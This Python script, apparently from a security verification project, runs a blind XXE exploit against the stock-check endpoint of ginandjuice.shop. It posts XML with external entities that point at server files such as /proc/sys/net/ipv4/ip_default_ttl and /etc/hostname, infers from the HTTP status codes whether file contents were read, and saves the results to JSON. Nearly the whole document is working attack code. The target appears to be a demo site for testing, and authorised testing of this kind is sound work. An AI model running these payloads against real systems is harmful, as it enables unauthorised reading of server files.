#!/usr/bin/env python3
"""IV-13 Phase 6b: ginandjuice XXE — IN-BAND BLIND PROOF via integer-content files.
Logic: 'Invalid product ID' (400) = productId resolved to a NON-integer.
       404 = valid integer but unknown product.
       'XML parsing error' (400) = entity undefined/unresolvable.
So if &xxe; resolves to a file containing an INTEGER (e.g. /proc/sys/net/ipv4/ip_default_ttl
= '64'), the response should become 404 (integer accepted, product unknown) instead of
'Invalid product ID' — proving file content flowed into application logic.
Also tries storeId variant and a non-existent numeric file as control."""
import json, os, time, ssl, urllib.request, urllib.error, http.cookiejar
from datetime import datetime, timezone, timedelta

BASE = 'https://ginandjuice.shop'
UA = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 IV13-IndependentVerifier/1.0'
CTX = ssl.create_default_context()
OUT = '/home/z/my-project/scripts/iv_out'
TZ = timezone(timedelta(hours=2))

def build():
    cj = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj),
                                       urllib.request.HTTPSHandler(context=CTX)), cj

def post_xml(opener, xml):
    hdrs = {'User-Agent': UA, 'Content-Type': 'application/xml',
            'Referer': BASE + '/catalog/product?productId=1', 'Origin': BASE}
    r = urllib.request.Request(BASE + '/catalog/product/stock', data=xml.encode(), headers=hdrs, method='POST')
    try:
        resp = opener.open(r, timeout=25)
        return resp.status, resp.read().decode('utf-8', 'replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', 'replace')
    except Exception as e:
        return None, repr(e)[:150]

def xml_pid(inner):
    return ('<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE stockCheck [<!ENTITY xxe SYSTEM "%s">]>'
            '<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>' % inner)

def xml_sid(inner):
    return ('<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE stockCheck [<!ENTITY xxe SYSTEM "%s">]>'
            '<stockCheck><productId>1</productId><storeId>&xxe;</storeId></stockCheck>' % inner)

op, cj = build()
try:
    r0 = urllib.request.Request(BASE + '/catalog/product?productId=1', headers={'User-Agent': UA})
    op.open(r0, timeout=25).read()
except Exception:
    pass

results = {'ts': datetime.now(TZ).isoformat(timespec='seconds'), 'tests': []}
CASES = [
    ('pid-numeric-ttl', xml_pid('file:///proc/sys/net/ipv4/ip_default_ttl')),
    ('pid-numeric-pidmax', xml_pid('file:///proc/sys/kernel/pid_max')),
    ('pid-numeric-ctrl-nonexistent', xml_pid('file:///proc/sys/net/ipv4/iv13-no-such-int')),
    ('pid-hostname-ctrl', xml_pid('file:///etc/hostname')),
    ('sid-numeric-ttl', xml_sid('file:///proc/sys/net/ipv4/ip_default_ttl')),
    ('pid-literal-64-ctrl', ('<?xml version="1.0" encoding="UTF-8"?>'
                             '<stockCheck><productId>64</productId><storeId>1</storeId></stockCheck>')),
    ('pid-literal-abc-ctrl', ('<?xml version="1.0" encoding="UTF-8"?>'
                              '<stockCheck><productId>abc</productId><storeId>1</storeId></stockCheck>')),
]
for label, xml in CASES:
    st, body = post_xml(op, xml)
    rec = {'label': label, 'status': st, 'len': len(body), 'body': body[:200]}
    results['tests'].append(rec)
    print('%-28s %s len=%-4d %r' % (label, st, len(body), body[:100]), flush=True)
    time.sleep(0.6)

with open(os.path.join(OUT, 'gj_xxe2.json'), 'w') as f:
    json.dump(results, f, indent=1, ensure_ascii=False)
print('\nsaved -> scripts/iv_out/gj_xxe2.json')
